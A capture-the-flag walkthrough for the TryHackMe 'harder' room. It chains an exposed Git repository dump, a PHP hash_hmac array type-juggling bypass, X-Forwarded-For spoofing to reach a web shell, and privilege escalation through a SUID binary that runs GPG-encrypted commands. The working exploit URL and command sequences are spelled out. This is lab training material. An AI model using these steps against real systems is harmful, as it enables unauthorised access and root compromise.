# [harder](https://tryhackme.com/room/harder)

## Real pentest findings combined

# Hack your way and try harder

## The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distribution is used and where certain configurations are located.

## Re-scan all newly found web services/folders and may use some wordlists from seclists (https://tools.kali.org/password-attacks/seclists). Read the source with care.

## Edit: There is a second way to get root access without using any key...are you able to spot the bug?

### Hack the machine and obtain the user Flag (user.txt)

1. Start with an nmap scan to identify open ports and services on the target machine.

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Navigate to `http://<TARGET_IP>` in a browser with Developer Tools open. In the `Network` tab, examine the HTTP response headers. The `Set-Cookie` header contains `domain=pwd.harder.local`, revealing a subdomain.

[SCREEN02]

3. Add the discovered subdomain to your local hosts file to enable DNS resolution.

```bash
echo "<TARGET_IP> pwd.harder.local" >> /etc/hosts
```

4. Access `http://pwd.harder.local` in your browser. Test for default credentials. Login succeeds with `admin:admin`.

5. After logging in, enumerate common directories. Testing port 80 reveals an accessible Git repository at `http://pwd.harder.local/.git/`.

6. Use [GitTools](https://github.com/internetwache/GitTools) to dump the exposed Git repository for source code analysis.

```bash
./GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ git
```

[SCREEN03]

7. Review the commit history to identify sensitive information or configuration changes.

```bash
git log
```

[SCREEN04]

8. Checkout the repository files and examine the authentication mechanism in `hmac.php`.

```bash
git checkout .
ls -a
cat hmac.php
```

The `hmac.php` file reveals an HMAC-based authentication bypass vulnerability:

```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```

When `$_GET['n']` is an array instead of a string, `hash_hmac()` returns `false`. This means `$secret` becomes `false`, allowing us to generate a valid HMAC with a known secret value.

9. Generate a valid HMAC hash using `false` as the secret key.

```bash
php -r "echo hash_hmac('sha256', 'host.com', false);"
```

[SCREEN05]

10. Construct the exploit URL with array manipulation to bypass HMAC validation: `http://pwd.harder.local/index.php?n[]=1&host=host.com&h=36db67bac0cc809bf1f77c301fce9a162576b4b7369733997dc004d86b802e2d`. The response reveals:

    - Next target URL: `http://shell.harder.local`
    - Credentials: `evs:9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm`

[SCREEN06]

11. Add the newly discovered subdomain to the hosts file.

```bash
echo "<TARGET_IP> shell.harder.local" >> /etc/hosts
```

12. Navigate to `http://shell.harder.local` and authenticate with the discovered credentials (`evs:9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm`). The application displays: `Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed`.

13. Use Burp Suite or another proxy to intercept the POST request to the web shell. Add the `X-Forwarded-For` header to spoof an allowed IP address:

[SCREEN07]

14. Execute commands through the web shell to enumerate the system and retrieve the user flag.

```bash
whoami
ls /home
ls /home/evs
cat /home/evs/user.txt
```

[SCREEN08]

---

### Escalate your privileges and get the root Flag (root.txt)

1. Enumerate the system for additional credentials. Check periodic tasks and backup scripts:

```
POST /index.php HTTP/1.1
Host: shell.harder.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
X-Forwarded-For: 10.10.10.10
Cookie: PHPSESSID=gafs518tb8sc69p0916orlm3t4

cmd=cat /etc/periodic/15min/evs-backup.sh
```

The backup script reveals SSH credentials: `evs:U6j1brxGqbsUA$pMuIodnb$SZB4$bw14`

[SCREEN09]

2. Use the discovered credentials to establish a proper SSH session.

```bash
ssh evs@<TARGET_IP>
```

3. Search for unusual executables and scripts that might provide privilege escalation vectors.

```bash
find / -name *.sh 2>/dev/null
cat /usr/local/bin/run-crypted.sh
ls -la /usr/local/bin
```

The script `/usr/local/bin/execute-crypted` is SUID and owned by root. It executes GPG-encrypted commands.

[SCREEN10]

4. Locate GPG public keys on the system that might be used for encryption.

```bash
find / -name "root@harder*" 2>/dev/null
```

Found: `/var/backup/root@harder.local.pub`

5. Import the root user's public GPG key to encrypt commands that the SUID binary will execute.

```bash
gpg --import /var/backup/root@harder.local.pub
```

6. Create a script containing the command to read the root flag.

```bash
echo "cat /root/root.txt" > cmd
```

7. Encrypt the command file using the root user's public key.

```bash
gpg --recipient root@harder.local cmd
gpg --recipient root@harder.local --encrypt cmd
```

[SCREEN11]

8. Execute the encrypted command using the SUID binary, which will decrypt and run it as root.

```bash
/usr/local/bin/execute-crypted cmd.gpg
```

The script decrypts and executes the command as root, displaying the root flag.

[SCREEN12]
